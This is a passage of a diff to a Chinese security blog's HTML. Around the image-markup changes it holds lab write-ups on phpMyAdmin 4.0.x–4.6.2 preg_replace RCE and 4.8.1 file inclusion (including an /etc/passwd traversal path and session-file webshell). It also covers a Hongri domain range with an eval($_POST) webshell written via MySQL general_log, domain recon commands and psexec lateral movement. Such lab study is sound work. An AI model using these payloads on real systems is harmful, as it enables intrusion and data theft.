+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_26.png" alt="" /></figure>
+
+
+</p>
 <h3 id="cs后渗透_横向移动">CS后渗透_横向移动</h3>
 <p>上线cs之后,使用cs上面的横向移动模块中psexec就能解决掉剩下的两台机器了</p>
 <p>域控
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_27.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_27.png" alt="" /></figure>
+
+
+</p>
 <p>PC机器
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_28.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_28.png" alt="" /></figure>
+
+
+</p>
 <h1 id="links">links</h1>
 <p><a href="https://xz.aliyun.com/t/11676" target="_blank" rel="noopener nofollow noreferrer" >https://xz.aliyun.com/t/11676</a></p>
 <p><a href="https://www.viewofthai.link/2022/09/11/" target="_blank" rel="noopener nofollow noreferrer" >https://www.viewofthai.link/2022/09/11/</a>红日att＆ck系列靶场（二）/</p>
@@ -823,27 +1063,62 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#34;/test/e&#34;</span>,<span style="color:#e6db74">&#39;phpinfo()&#39;</span>,<span style="color:#e6db74">&#34;jutst test&#34;</span>);
 </span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_1.png" alt=""  /></p>
+</span></span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_1.png" alt="" /></figure>
+
+
+</p>
 <h2 id="漏洞复现">漏洞复现</h2>
 <p>//手测,脚本</p>
 <p>使用的vulhub的环境,使用docker启动就行</p>
 <p>这里是直接使用了exploit-db中的poc
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_2.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_2.png" alt="" /></figure>
+
+
+</p>
 <h2 id="漏洞分析">漏洞分析</h2>
 <p>// 分析原理,调用链</p>
 <p>参照网上其他人的分析文章,
 首先找到preg_replace()函数的调用位置,
 发现是在 /libraries/TableSearch.class.php 文件中的_getRegexReplaceRows方法里面</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_3.png" alt=""  />
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_3.png" alt="" /></figure>
+
+
+
 接下来就是依次寻找find,replaceWith和row[0]这三个参数的来源</p>
 <p>可以看到find,replaceWith是直接从getReplacePreview中传递过去的
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_4.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_4.png" alt="" /></figure>
+
+
+
 继续往上查找getReplacePreview方法,发现是在tbl_find_replace.php中被调用的,这里的可以看到find,replaceWith都是直接从POST中传递进来的
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_5.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_5.png" alt="" /></figure>
+
+
+</p>
 <p>解决了前面两个参数,接下来就是看第三个参数是怎么来的,毕竟这个/e参数要成功执行代码,需要正则的模式被匹配到.</p>
 <p>回到_getRegexReplaceRows方法,可以看到row[0]应该是sql语句查询结果的第一列数据
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_6.png" alt=""  />
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_7.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_6.png" alt="" /></figure>
+
+
+
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_7.png" alt="" /></figure>
+
+
+
 sql语句的内容如下</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> 
 </span></span><span style="display:flex;"><span>    PMA_Util::backquote(<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#66d9ef">column</span>),   <span style="color:#75715e">-- 获取列名并进行反引号处理
@@ -862,23 +1137,63 @@ sql语句的内容如下</p>
 </span></span><span style="display:flex;"><span>    PMA_Util::backquote(<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#66d9ef">column</span>) <span style="color:#66d9ef">ASC</span>   <span style="color:#75715e">-- 按目标列升序排列
 </span></span></span></code></pre></div><p>这里面我们需要能够控制column,_db,_table,其中column是来自columnIndex这个参数,这个也是POST传进来的</p>
 <p>剩下两个参数是PMA_TableSearch类的属性,是在构造函数里面被定义的
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_8.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_8.png" alt="" /></figure>
+
+
+
 继续回溯,tbl_find_replace.php中创建了这个类,并传入了$db, $table这两个参数
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_9.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_9.png" alt="" /></figure>
+
+
+
 这两个参数是包含的libraries/common.inc.php文件,这两个参数可以通过REQUEST方法来接收变量并将其设置为全局变量。
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_10.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_10.png" alt="" /></figure>
+
+
+</p>
 <p>结合上面的分析,看看exploit-db给的poc</p>
 <p>使用poc,然后用burpsuite抓了一下包,脚本先是进行了登录
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_11.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_11.png" alt="" /></figure>
+
+
+
 前面两个数据包好像都是在获取一些Cookie信息,第一个是在登录获取token值,第二个包是在访问主页,获取了另外的一些值
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_12.png" alt=""  />
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_13.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_12.png" alt="" /></figure>
+
+
+
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_13.png" alt="" /></figure>
+
+
+
 第三个包访问了/import.php,这个文件是PhpMyAdmin中处理SQL导入的页面。这个页面允许管理员导入SQL查询语句，并在数据库中执行。</p>
 <p>创建了一个数据库test,数据表prgpwn,以及插入了数据(<code>0/e\0</code>)  即0/e和一个null byte
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_14.png" alt="|900"  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_14.png" alt="|900" /><figcaption>|900</figcaption></figure>
+
+
+
 最后一个包,访问了漏洞所在的php文件,/tbl_find_replace.php</p>
 <p>传入了db,table,find,replaceWith这些参数,find和replaceWith直接被拼接到了preg_replace的前面两个参数中,而POST的数据中的db,table,columnIndex指定了sql查询得到的结果,这个结果被拼接到了preg_replace的第三个参数,从而触发了preg_replace的/e参数的执行代码功能.
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_15.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_15.png" alt="" /></figure>
+
+
+
 find参数中传进去的%00也就是空字符,将拼接之后的/给截断了</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 </span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#34;/0/e</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">/&#34;</span>,<span style="color:#e6db74">&#34;system(&#39;id&#39;)&#34;</span>,<span style="color:#e6db74">&#34;0/e</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span>)
@@ -941,12 +1256,22 @@ find参数中传进去的%00也就是空字符,将拼接之后的/给截断了</
 <p>远程文件包含利用需要下面这两个配置文件都开启
 当allow_url_include和allow_url_fopen都开启时，可以通过利用远程url或者php://协议直接getshell，即远程文件包含，
 但allow_url_include在php5.2之后默认为off，利用机会有限。
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/phpmyadmin-4.8.1%e8%bf%9c%e7%a8%8b%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab_image_1.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/phpmyadmin-4.8.1%e8%bf%9c%e7%a8%8b%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab_image_1.png" alt="" /></figure>
+
+
+
 当allow_url_include and allow_url_fopen均为off 在window主机环境下仍然可以进行远程文件执行，用445端口SMB协议进行远程加载。</p>
 <h2 id="漏洞复现">漏洞复现</h2>
 <p>直接访问下面的路径,能输出passwd内容那就是有了</p>
 <p><code>/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</code>
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/phpmyadmin-4.8.1%e8%bf%9c%e7%a8%8b%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab_image_2.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/phpmyadmin-4.8.1%e8%bf%9c%e7%a8%8b%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab_image_2.png" alt="" /></figure>
+
+
+</p>
 <p>利用方式的话,就是先在sql栏执行一下select命令,然后去包含session文件,就能获得webshell,进而拿shell</p>
 <p>可以执行一下<code>SELECT &lt;?=phpinfo()?&gt;;</code>，然后查看自己的sessionid（cookie中phpMyAdmin的值），然后包含session文件即可：</p>
 <p>对应的sessions文件是 /tmp/sess_sessionid
@@ -1031,15 +1356,40 @@ find参数中传进去的%00也就是空字符,将拼接之后的/给截断了</
 <h1 id="红日靶场1-win域">红日靶场1-win域</h1>
 <h2 id="环境搭建">环境搭建</h2>
 <p>下载完之后,解压,并在vmware中扫描虚拟机</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_1.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_1.png" alt="" /></figure>
+
+
+</p>
 <p>根据这个网络拓扑图,win7机器有两个网卡,是通外网的,win2003和win2008是在内网环境中</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_2.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_2.png" alt="" /></figure>
+
+
+</p>
 <p>先给win7添加一下网卡,这里我习惯使用桥接,所以另一个网卡是桥接模式</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_3.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_3.png" alt="" /></figure>
+
+
+</p>
 <p>然后再为另外两台机器设置only-host模式,并在网络编辑器中将这个模式的网段修改为192.168.53.0/24</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_4.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_4.png" alt="" /></figure>
+
+
+</p>
 <p>最后进入win7机器,进去之后要改默认密码(hongrisec@2019),改成了l1uyun@2024,启动web服务器.</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_5.png" alt="|536"  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_5.png" alt="|536" /><figcaption>|536</figcaption></figure>
+
+
+</p>
 <h2 id="外网渗透">外网渗透</h2>
 <h3 id="端口扫描">端口扫描</h3>
 <p>win7机器是桥接在192.168.71.0/24这个子网的</p>
@@ -1100,38 +1450,93 @@ find参数中传进去的%00也就是空字符,将拼接之后的/给截断了</
 </span></span><span style="display:flex;"><span>MAC Address: 00:0C:29:A7:C1:B2 <span style="color:#f92672">(</span>VMware<span style="color:#f92672">)</span>
 </span></span></code></pre></div><h3 id="phpmyadmin弱口令日志写入getshell">phpmyadmin弱口令+日志写入Getshell</h3>
 <p>进去之后是phpstudy页面,数据库这里使用root,root测试成功</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_6.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_6.png" alt="" /></figure>
+
+
+</p>
 <p>尝试在外面连接,连不上去</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>➜  workspace  mysql -h 192.168.71.79 -u root -p
 </span></span><span style="display:flex;"><span>Enter password:
 </span></span></code></pre></div><p>扫目录发现存在phpmyadmin,phpstudy这玩意集成了phpmyadmin</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_7.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_7.png" alt="" /></figure>
+
+
+</p>
 <p>这里的secure_file_priv=NULL,不允许导入导出,所以不能直接写入shell</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_8.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_8.png" alt="" /></figure>
+
+
+</p>
 <p>再尝试一下通过日志Getshell的方法</p>
 <p>SHOW VARIABLES LIKE &lsquo;%general_log%&rsquo;</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_9.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_9.png" alt="" /></figure>
+
+
+</p>
 <p>启用日志功能,然后修改日志文件路径,这里的绝对路径是在php探针里面泄露的</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>set global general_log <span style="color:#f92672">=</span> on;
 </span></span><span style="display:flex;"><span>set global general_log_file<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;C:/phpStudy/WWW/shell.php&#39;</span>;
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#e6db74">&#34;&lt;?php @eval(</span>$_POST<span style="color:#e6db74">[&#39;123&#39;]);?&gt;&#34;</span>
-</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_10.png" alt=""  /></p>
+</span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_10.png" alt="" /></figure>
+
+
+</p>
 <p>使用蚁剑连接,拿到shell</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_11.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_11.png" alt="" /></figure>
+
+
+</p>
 <h3 id="yxcms后台修改模板getshell">yxcms后台修改模板Getshell</h3>
 <p>以学习为主,phpmyadmin拿到shell之后,再看看有没有其他的拿shell的方法吧</p>
 <p>查看路径,发现有个yxcms,进去看看</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_12.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_12.png" alt="" /></figure>
+
+
+</p>
 <p>这都不用搜索了,前台模板这个位置大概率能执行php代码</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_13.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_13.png" alt="" /></figure>
+
+
+</p>
 <p>找到这个layout.php,这个文件是每个页面都需要包含的,所以在这里写入webshell</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_14.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_14.png" alt="" /></figure>
+
+
+</p>
 <p>可以连接</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_15.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_15.png" alt="" /></figure>
+
+
+</p>
 <p>这个cms里面也有sql执行,就不看了</p>
 <h2 id="内网渗透">内网渗透</h2>
 <h3 id="信息收集">信息收集</h3>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_16.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_16.png" alt="" /></figure>
+
+
+</p>
 <p>域渗透信息收集checklist</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> ipconfig /all   <span style="color:#75715e"># 查看本机ip，所在域</span>
 </span></span><span style="display:flex;"><span> route print     <span style="color:#75715e"># 打印路由信息</span>
@@ -1157,22 +1562,52 @@ find参数中传进去的%00也就是空字符,将拼接之后的/给截断了</
 </span></span><span style="display:flex;"><span> net group <span style="color:#e6db74">&#34;domain computers&#34;</span> /domain  <span style="color:#75715e"># 查看域中的其他主机名</span>
 </span></span><span style="display:flex;"><span> net group <span style="color:#e6db74">&#34;doamin controllers&#34;</span> /domain  <span style="color:#75715e"># 查看域控制器（可能有多台）</span>
 </span></span></code></pre></div><p>权限是administrator</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_17.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_17.png" alt="" /></figure>
+
+
+</p>
 <p>发现有内网网段</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_18.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_18.png" alt="" /></figure>
+
+
+</p>
 <p>查看域用户</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_19.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_19.png" alt="" /></figure>
+
+
+</p>
 <p>查看域管理员信息</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_20.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
